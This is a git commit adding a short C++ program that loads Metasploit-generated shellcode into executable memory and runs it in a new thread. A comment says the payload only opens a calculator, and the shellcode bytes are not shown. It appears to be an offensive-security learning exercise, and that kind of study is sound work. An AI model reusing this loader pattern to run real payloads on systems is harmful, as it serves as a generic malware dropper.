e3bf73c47a46980a53e89bc92bb32c2ae80cfdf5
Natsukooh <romain74.baudet@gmail.com>
2022-12-16 12:55:19 +0100

    First commit

---
+++ unstaged.cpp
@@ -0,0 +1,41 @@
+// This program's goal is to try to create a new process to execute a shellcode that will open a calculator
+
+#include <Windows.h>
+#include "unstaged_shellcode.hpp"
+
+int main()
+{
+	// Allocate the memory
+	void* memory = VirtualAlloc(nullptr,
+								sizeof(metasploit_unstaged_shellcode),
+								MEM_COMMIT,
+								PAGE_EXECUTE_READWRITE);
+
+	if (memory == nullptr)
+	{
+		return 1;
+	}
+
+	// Move the shellcode to the allocated memory
+	memcpy(memory,
+		   metasploit_unstaged_shellcode,
+		   sizeof(metasploit_unstaged_shellcode));
+
+	// Create a thread pointing to the shellcode address
+	HANDLE thread =	CreateThread(nullptr,
+				 0,
+				 (LPTHREAD_START_ROUTINE) memory,
+				 nullptr,
+				 0,
+				 nullptr);
+
+	if (thread == nullptr)
+	{
+		return 1;
+	}
+
+	// Wait for the thread to finish
+	WaitForSingleObject(thread, INFINITE);
+
+	return 0;
+}
